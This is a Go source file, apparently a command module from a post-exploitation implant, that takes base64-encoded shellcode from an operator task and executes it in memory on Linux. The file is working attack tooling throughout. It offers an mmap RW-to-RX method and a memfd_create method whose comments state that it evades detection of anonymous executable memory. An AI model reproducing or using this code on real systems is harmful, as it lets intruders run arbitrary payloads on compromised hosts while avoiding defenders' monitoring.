//go:build linux

package commands

import (
	"encoding/base64"
	"os"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/unix"
)

type ExecuteShellcodeCommand struct{}

func (c *ExecuteShellcodeCommand) Name() string {
	return "execute-shellcode"
}

func (c *ExecuteShellcodeCommand) Description() string {
	return "Execute shellcode in the current process via mmap or memfd_create"
}

func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: shellcode_b64 parameter required")
	}
	args, parseErr := unmarshalParams[executeShellcodeArgs](task)
	if parseErr != nil {
		return *parseErr
	}
	if args.ShellcodeB64 == "" {
		return errorResult("Error: shellcode_b64 is empty")
	}

	shellcode, err := base64.StdEncoding.DecodeString(args.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: shellcode is empty after decoding")
	}

	technique := strings.ToLower(args.Technique)
	if technique == "" {
		technique = "mmap"
	}

	switch technique {
	case "mmap":
		return executeShellcodeMmap(shellcode)
	case "memfd":
		return executeShellcodeMemfd(shellcode)
	default:
		return errorf("Unknown technique: %s (use mmap or memfd)", args.Technique)
	}
}

func executeShellcodeMmap(shellcode []byte) structs.CommandResult {
	pageSize := syscall.Getpagesize()
	allocSize := ((len(shellcode) + pageSize - 1) / pageSize) * pageSize

	data, err := syscall.Mmap(-1, 0, allocSize,
		syscall.PROT_READ|syscall.PROT_WRITE,
		syscall.MAP_PRIVATE|syscall.MAP_ANONYMOUS)
	if err != nil {
		return errorf("mmap failed: %v", err)
	}

	copy(data, shellcode)

	err = syscall.Mprotect(data, syscall.PROT_READ|syscall.PROT_EXEC)
	if err != nil {
		_ = syscall.Munmap(data)
		return errorf("mprotect RX failed: %v", err)
	}

	addr := uintptr(unsafe.Pointer(&data[0]))
	funcAddr := addr
	funcPtr := &funcAddr
	go func() {
		runtime.LockOSThread()
		fn := *(*func())(unsafe.Pointer(&funcPtr))
		fn()
	}()

	return successf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Method: mmap RW + mprotect RX\n  Thread created and running",
		len(shellcode), addr)
}

// executeShellcodeMemfd uses memfd_create to create an anonymous file descriptor,
// writes shellcode to it, then mmaps the fd as executable. The resulting memory
// region appears file-backed rather than anonymous, evading detections that flag
// anonymous executable mappings.
func executeShellcodeMemfd(shellcode []byte) structs.CommandResult {
	fd, err := unix.MemfdCreate("", unix.MFD_CLOEXEC)
	if err != nil {
		return errorf("memfd_create failed: %v", err)
	}

	memFile := os.NewFile(uintptr(fd), "memfd")

	if _, err := memFile.Write(shellcode); err != nil {
		memFile.Close()
		return errorf("memfd write failed: %v", err)
	}

	pageSize := syscall.Getpagesize()
	allocSize := ((len(shellcode) + pageSize - 1) / pageSize) * pageSize

	// Seal writes so the kernel treats it as a clean file-backed mapping.
	// F_ADD_SEALS=1033, F_SEAL_WRITE=8, F_SEAL_SHRINK=2, F_SEAL_GROW=4
	_, _, _ = syscall.Syscall(syscall.SYS_FCNTL, uintptr(fd), 1033, 8|2|4)

	data, err := syscall.Mmap(fd, 0, allocSize,
		syscall.PROT_READ|syscall.PROT_EXEC,
		syscall.MAP_PRIVATE)
	if err != nil {
		memFile.Close()
		return errorf("mmap memfd failed: %v", err)
	}

	memFile.Close()

	addr := uintptr(unsafe.Pointer(&data[0]))
	funcAddr := addr
	funcPtr := &funcAddr
	go func() {
		runtime.LockOSThread()
		fn := *(*func())(unsafe.Pointer(&funcPtr))
		fn()
	}()

	return successf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Method: memfd_create + mmap RX (fd-backed)\n  Thread created and running",
		len(shellcode), addr)
}

// ShellcodeTechniqueHelp returns available technique descriptions for this platform.
func ShellcodeTechniqueHelp() string {
	return "Available techniques:\n  mmap  — anonymous mmap RW + mprotect RX (default)\n  memfd — memfd_create fd-backed mapping, evades anonymous RX detection"
}
